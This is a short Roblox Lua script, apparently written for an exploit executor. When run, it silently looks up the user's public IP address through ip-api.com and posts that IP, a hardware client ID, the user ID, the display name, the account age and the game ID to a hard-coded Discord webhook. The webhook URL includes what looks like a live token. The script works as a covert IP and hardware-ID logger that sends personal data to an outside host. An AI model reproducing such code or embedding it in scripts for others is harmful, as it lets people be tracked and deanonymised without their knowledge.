local HttpService = game:GetService("HttpService")
local plr = game:GetService("Players")
local lplr = plr.LocalPlayer

Webhook_URL = "https://discord.com/api/webhooks/1242406279327256577/HPPyU_SzCzz4sktDAeWzrahzQsp0l1Cyww5l0gAdG5r0foCS40BOBToYVP3-IiHB0m7Y"
local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = 'GET'
})

local ipinfo_table = HttpService:JSONDecode(ip_info.Body)

local response = request(
{
    Url = Webhook_URL,
	Method = 'POST',
	Headers = {
	    ['Content-Type'] = 'application/json'
	},
	Body = HttpService:JSONEncode({
	    ["content"] = "",
		["embeds"] = {{
		    ["title"] = "**Your script has been executed!**",
			["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["fields"] = {
			    {
				    ["name"] = "Hardware ID:",
					["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true
				},
                {
                    ["name"] = "Game Logged:",
                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID:",
                    ["value"] = lplr.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age:",
                    ["value"] = lplr.AccountAge.." days",
                    ["inline"] = true
                },
                {
                    ["name"] = "IP:",
                    ["value"] = ipinfo_table.query,
                    ["inline"] = true
                }
			}
		}}
	})
}
)
